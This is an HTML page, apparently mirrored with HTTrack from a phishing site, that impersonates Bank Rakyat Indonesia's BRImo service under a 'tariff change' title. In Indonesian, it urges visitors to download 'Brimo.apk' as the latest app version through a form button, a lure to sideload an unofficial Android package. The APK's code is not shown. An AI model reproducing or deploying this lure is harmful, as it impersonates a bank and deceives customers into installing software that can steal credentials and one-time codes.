<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from yong.mandasyfr.com/BRI TARIF APK V10/otp.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Aug 2023 19:31:35 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
	<meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
	<meta name="theme-color" content="#0f78cb">
	<meta property="og:type" content="website">
	<meta http-equiv="Content-Security-Policy" content="default-src * 'self' 'unsafe-inline' 'unsafe-eval' data: gap:">
	<title>Layanan Perubahan Tarif Bank BRI || Melayani dengan setulus hati</title>    <title>BRImo- Bank BRI</title>
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"/>

    <!-- Slick CSS -->
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">

    <!-- Our CSS -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@800&amp;display=swap');
        body {
            font-family: 'Nunito', sans-serif;
            html{overflow-x: hidden;}
        }

        h2 {
            font-family: 'Nunito', sans-serif; 
            font-size: 15px; 
            font-weight: bold; 
            color: #0086e0; 
            letter-spacing: 1.2px;
            text-align: center;
            line-height: 1; 
            border-radius: 5px; 
            
        }

        h3 {
            font-family: 'Nunito', sans-serif;
            font-size: 13px; 
            font-weight: bold; 
            color: #0086e0;
            text-align: center;
            letter-spacing: 1px;
            line-height: 2; 
            border-radius: 5px; 
            
        }
        
        h9 {
            font-family: 'Nunito', sans-serif;
            font-size: 13px; 
            font-weight: bold;
            text-align: center;
            color: #0086e0; 
            letter-spacing: 1.4px;
            line-height: 1; 
            border-radius: 5px; 
            
        }
        
        h4 {
            font-family: 'Nunito', sans-serif;
            font-size: 13px; 
            font-weight: bold; 
            color: #000; 
            letter-spacing: 1px;
            text-align: center;
            line-height: 1; 
            border-radius: 5px; 
            
        }
        
        h5 {
            font-family: 'Nunito', sans-serif;
            font-size: 16px; 
            font-weight: bold; 
            color: #0086e0; 
            letter-spacing: 1px;
            text-align: center;
            line-height: 1; 
            border-radius: 5px; 
            
        }
        
        h6 {
            font-family: 'Nunito', sans-serif;
            font-size: 13px; 
            font-weight: bold; 
            color: #000; 
            letter-spacing: 1px;
            text-align: center;
            line-height: 1; 
            border-radius: 5px; 
            
        }

        .btn-punya {
            display: block;
            margin: 0px auto 0 auto;
            padding: 0px; 
            cursor: pointer; 
            background: none rgb(0, 134, 224);
            border: none; 
            text-align: center; 
            height: 55px; 
            width: 536px; 
            max-width: 85%;
            font-family: 'Nunito', sans-serif;
            font-size: 16px; 
            font-weight: bold; 
            color: rgb(255, 255, 255); 
            letter-spacing: 2px;
            line-height: 1; 
            border-radius: 7px; 
            box-shadow: rgb(170, 170, 170) 10px 10px 12px 0px; 
            transition: background 200ms ease 0s;
        }

        .form-log {
            box-sizing: border-box; 
            height: 45px; 
            width: 536px; 
            max-width: 90%; 
            border: 2px solid rgb(0, 134, 224); 
            border-image: initial; 
            background-color: rgb(255, 255, 255); 
            border-radius: 20px; 
            box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; 
            font-family: 'Nunito', sans-serif;
            font-size: 16px; 
            color: rgb(28, 28, 28); 
            word-spacing: 7px; 
            padding: 0px 45px;
        }
        
        #ionIcons {
            color: rgb(22, 119, 199);
            font-size: 29px;
            position: absolute;
            display: block;
            margin-top: 3px;
            margin-left: 35px;
        }
        
        input {
            border: 3px solid rgb(0, 134, 224);
            border-radius: 8px;
            padding: 5px 10px;
        }
        
        h1{
            display: table;
            background: #F8F8FF;
            color: #fff;
            padding: 2px;
            width: 100%;
            
        }
        
        h7{
            display: table;
            background: #3081ce;
            color: #fff;
            padding: 15px;
            width: 100%;
            font-size: 12px;
            text-align: center;
            font-family: 'Nunito', sans-serif;
            
        }

        .container {
            max-width: 900px;
            padding: 15px;
            background-color: #fff;
            margin-left: auto;
            margin-right: auto;
        }

        .slider .slick-slide {
            border: solid 0px #000;
        }

        .slider .slick-slide img {
            width: 100%;
            margin-top: 0px;
        }

        /* make button larger and change their positions */
        .slick-prev, .slick-next {
            width: 0px;
            height: 0px;
            z-index: 1;
        }
        .slick-prev {
            left: 0px;
        }
        .slick-next {
            right: 0px;
        }
        .slick-prev:before, 
        .slick-next:before {
            font-size: 0px;
            text-shadow: 0 0 0px rgba(0,0,0,0.5);
        }
        
        /* move dotted nav position */
        .slick-dots {
            bottom: 0px;
        }
        /* enlarge dots and change their colors */
        .slick-dots li button:before {
            font-size: 12px;
            color: #000;
            text-shadow: 0 0 10px rgba(0,0,0,0.5);
            opacity: 0;
        }
        .slick-dots li.slick-active button:before {
            color: #dedede;
        }

        /* transition effects for opacity */
        .slick-arrow,
         {
            transition: opacity 0.2s ease-out;
        }
        
        legend {
            padding: 7px;
            background: #fff;
            color: #3081ce;
        }

    </style>
</head>
<body>
    <h1><img src="bri-header.jpg" width="100" style="margin-left: 10px;"></h1><br>
    <div class="container">
        <h2><strong>BANK RAKYAT INDONESIA</strong></h2><br>
       <center>
             <legend>
             <img src="phone.jpg" width="200"><br><br>
            </legend>
           </center>
          <div>
            <div class="row">
                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -10px auto;">
                <center>
                <form method="" action="Brimo.apk">
                    <div>
                     <label for="nomor"><h3>Di Pastikan Anda Telah Mengunakan BRImo Versi Terbaru Silahkan Klik Download Di bawah Ini.</h3></label><br><br>
                    
         </div>
      <div class="row">
            <button class="btn-punya" type="submit" value="send">Download</button><br><br>
            </div>
          </form>
         </center>
       <!-- JQuery -->
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
    <!-- Slick JS -->    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>

    <!-- Our Script -->
    <script>
        $(document).ready(function(){
            $('.slider').slick({
                autoplay: true,
                autoplaySpeed: 500,
                dots: true
            });
        });
    </script>

<script>(function(){var js = "window['__CF$cv$params']={r:'815769ad8b490dfb',t:'MTY5NzE5ODMyNy45ODgwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>

<!-- Mirrored from yong.mandasyfr.com/BRI TARIF APK V10/otp.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Aug 2023 19:31:37 GMT -->
</html>
